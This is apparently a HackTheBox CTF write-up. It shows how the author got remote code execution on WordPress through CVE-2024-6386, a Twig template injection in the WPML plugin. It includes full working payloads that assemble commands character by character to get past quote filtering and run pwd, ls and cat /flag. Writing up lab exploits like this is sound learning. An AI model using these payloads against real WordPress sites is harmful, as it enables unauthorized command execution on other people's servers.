+++
title="lemon industries: wordpress goes sour"
date=2025-11-26
draft=false
tags=["web", "wordpress", "ssti", "rce", "cve"]
categories=["writeups"]
ctf="HackTheBox"
points=20
solves=156
+++

## tl;dr

WordPress 6.8.1 with WPML 4.6.12 plugin vulnerable to Twig SSTI (CVE-2024-6386). got contributor access as Holly Randle, bypassed quote filtering by slicing characters from context variables, executed `cat /flag` via template injection.

## what we're dealing with

challenge drops us on a WordPress site at `http://global.lemon.htb:30205/` running version 6.8.1. the tagline "Lemon Industries International - Emotionally Synchronized. Geographically Redundant" was already giving me corporate dystopia vibes, but whatever.

i had admin panel access at `/wp-admin/about.php` already authenticated as user "Holly Randle" with what looked like author/contributor privileges based on the "New Post" and "Edit Post" links visible in the dashboard.

## initial recon

first thing i did was run `wpscan` to see what we're working with:

```
wpscan --api-token [redacted] \
  --url "http://lemon.htb:42980/" \
  --enumerate vp \
  --plugins-detection aggressive
```

the scan immediately flagged some interesting stuff:

- WordPress core 6.8.1 (outdated, has 2 known CVEs)
- XML-RPC enabled (always fun for brute forcing)
- **WPML Multilingual CMS plugin version 4.6.12** - this caught my eye

most importantly, wpscan highlighted two vulnerabilities in WPML:
1. **CVE-2024-6386**: contributor+ RCE via Twig SSTI (fixed in 4.6.13)
2. CVE-2025-3488: contributor+ stored XSS via shortcode (fixed in 4.7.4)

the RCE looked way more interesting than XSS, so that became my target.

## understanding the vulnerability

CVE-2024-6386 is a server-side template injection in the WPML plugin's `wpml_language_switcher` shortcode. the plugin uses Twig for rendering, and fails to sanitize user input properly.

the catch? **you need contributor-level access** to create posts with shortcodes. fortunately, i already had that as Holly Randle.

the other catch? **WordPress strips quotes** (`'` and `"`), so standard SSTI payloads like `{{ system('id') }}` won't work. this meant i needed to get creative with character construction.

## testing the waters

i navigated to the post editor at `/wp-admin/post-new.php` and dropped in a test payload:

```
[wpml_language_switcher]
{{ 7 * 7 }}
[/wpml_language_switcher]
```

clicked preview, and boom - the number **49** rendered on the page. Twig was definitely evaluating my expressions. SSTI confirmed.

## the quote filtering problem

tried the obvious next step:

```
[wpml_language_switcher]
{{ system('id') }}
[/wpml_language_switcher]
```

nothing. WordPress was eating the quotes. i needed to construct the command string without using any quotes whatsoever.

## character slicing technique

the workaround is to extract individual characters from existing context variables and concatenate them. in WPML's Twig context, two useful variables are available:
- `css_classes` - contains strings like `"wpml-ls-statics-shortcode_actions"`
- `languages` - when joined, outputs language names or "Array"

using Twig's `slice` filter, i could extract individual characters by index and build strings dynamically.

here's what i learned from testing:
- `css_classes|slice(0,1)` → `w`
- `css_classes|slice(1,1)` → `p`
- `css_classes|slice(2,1)` → `m`
- `css_classes|slice(6,1)` → `s`

by mapping out the entire string, i could construct any command i needed character-by-character.

## building the exploit payload

my first goal was simple: execute `pwd` to confirm command execution and get a slash character for constructing paths.

```
[wpml_language_switcher]
{% set sp = css_classes|slice(33,1) %}  {# space #}
{% set p = css_classes|slice(1,1) %}   {# p #}
{% set w = css_classes|slice(0,1) %}   {# w #}
{% set d = css_classes|slice(23,1) %}  {# d #}
{% set s = css_classes|slice(6,1) %}   {# s #}
{% set y = languages|join|slice(4,1) %} {# y #}
{% set t = css_classes|slice(9,1) %}   {# t #}
{% set e = css_classes|slice(24,1) %}  {# e #}
{% set m = css_classes|slice(2,1) %}   {# m #}

{% set system = s~y~s~t~e~m %}
{% set pwd = p~w~d %}

{{[pwd]|map(system)|join}}
[/wpml_language_switcher]
```

preview showed `/var/www/html` - perfect. now i had working command execution.

## things that didn't work

before i found the right approach, i wasted time on a few dead ends:

1. **tried `app.request.query` method first** - the payload `{{ app.request.query.get('c')|filter('system') }}` should have let me pass commands via URL parameters, but the `app` object wasn't available in WPML's Twig context. annoying.

2. **attempted to find 'f' and 'g' in `css_classes`** - needed these letters to spell "flag". standard WPML classes don't contain them, so my initial `cat /flag` payload just silently failed.

3. **tried wildcards** - thought i could do `cat /fla*` or `cat /*lag` but couldn't find an asterisk character in any context variable.

## the breakthrough

decided to just list the root directory first to see what i was working with:

```
[wpml_language_switcher]
{% set sp = css_classes|slice(33,1) %}
{% set a = css_classes|slice(10,1) %}
{% set s = css_classes|slice(6,1) %}
{% set l = css_classes|slice(3,1) %}  {# from wpml #}
{% set dash = css_classes|slice(4,1) %}  {# hyphen #}
{% set p = css_classes|slice(1,1) %}
{% set w = css_classes|slice(0,1) %}
{% set d = css_classes|slice(23,1) %}
{% set t = css_classes|slice(9,1) %}
{% set e = css_classes|slice(24,1) %}
{% set m = css_classes|slice(2,1) %}
{% set y = languages|join|slice(4,1) %}

{% set system = s~y~s~t~e~m %}
{% set pwd = p~w~d %}
{% set slash = [pwd]|map(system)|join|slice(0,1) %}
{% set ls = l~s %}
{% set args = dash~l~a %}

{% set cmd = ls~sp~args~sp~slash %}
{{[cmd]|map(system)|join}}
[/wpml_language_switcher]
```

output showed:

```
lrwxrwxrwx 1 root root 9 Aug 2 10:13 flag -> /flag.txt
-rw-r--r-- 1 root root 57 Nov 26 13:18 flag.txt
```

there it is - `/flag.txt` in the root directory.

## generating missing characters

for "flag", i still needed the letters 'f' and 'g'. neither exists in the standard `css_classes` string. but Twig's `dump()` function outputs strings like `"string(1) "a""` or `"bool(false)"`.

clever trick:
- `dump(a)` → outputs `"string(1) "a""` → index 5 is **'g'**
- `dump(false)` → outputs `"bool(false)"` → index 5 is **'f'**

perfect. now i could construct the full command.

## final payload

```
[wpml_language_switcher]
{# basic character setup #}
{% set sp = css_classes|slice(33,1) %}
{% set a = css_classes|slice(10,1) %}
{% set c = css_classes|slice(13,1) %}
{% set t = css_classes|slice(9,1) %}
{% set p = css_classes|slice(1,1) %}
{% set w = css_classes|slice(0,1) %}
{% set d = css_classes|slice(23,1) %}
{% set s = css_classes|slice(6,1) %}
{% set e = css_classes|slice(24,1) %}
{% set m = css_classes|slice(2,1) %}
{% set l = css_classes|slice(3,1) %}
{% set y = languages|join|slice(4,1) %}

{# build system function #}
{% set system = s~y~s~t~e~m %}

{# get slash from pwd output #}
{% set pwd = p~w~d %}
{% set slash = [pwd]|map(system)|join|slice(0,1) %}

{# generate missing 'f' and 'g' via dump trick #}
{% set g = dump(a)|slice(5,1) %}
{% set f = dump(false)|slice(5,1) %}

{# construct: cat /flag #}
{% set cmd = c~a~t~sp~slash~f~l~a~g %}

{# execute #}
{{[cmd]|map(system)|join}}
[/wpml_language_switcher]
```

pasted this into the post editor, clicked preview, and scrolled through the rendered page...

## flag

```
flag{*******}
```

## lessons learned

1. **never trust WordPress plugins** - especially popular ones like WPML with 1M+ installs. patch your stuff.
2. **quote filtering isn't enough** - WordPress strips quotes thinking it prevents injection, but character slicing bypasses it completely.
3. **SSTI is still alive in 2025** - and it's still devastating when found in the right context.
4. **contributor role = RCE** - on vulnerable sites. least privilege matters.

honestly, this was a pretty straightforward challenge once i understood the character slicing technique. the most annoying part was mapping out all the indices in `css_classes` to find usable letters. spent way more time on that than i'd like to admit.

the `dump()` trick for generating 'f' and 'g' felt clever though. would have taken me ages to find those characters otherwise.

10/10 challenge, would exploit WordPress again.
